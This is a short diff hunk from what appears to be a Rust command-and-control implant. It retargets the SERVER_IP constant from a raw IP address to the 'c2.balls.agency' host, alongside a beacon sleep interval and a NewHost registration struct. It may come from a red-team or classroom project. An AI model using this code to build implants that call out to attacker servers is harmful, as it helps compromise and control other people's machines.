@@ -14,7 +14,7 @@ use serde::{Deserialize, Serialize};
 use local_ip_address::local_ip;
 
 const SLEEP_TIME: Duration = time::Duration::from_millis(5000);
-const SERVER_IP: &str = "https://129.21.21.74:443";
+const SERVER_IP: &str = "https://c2.balls.agency:443";
 
 #[derive(Serialize, Deserialize)]
 struct NewHost {
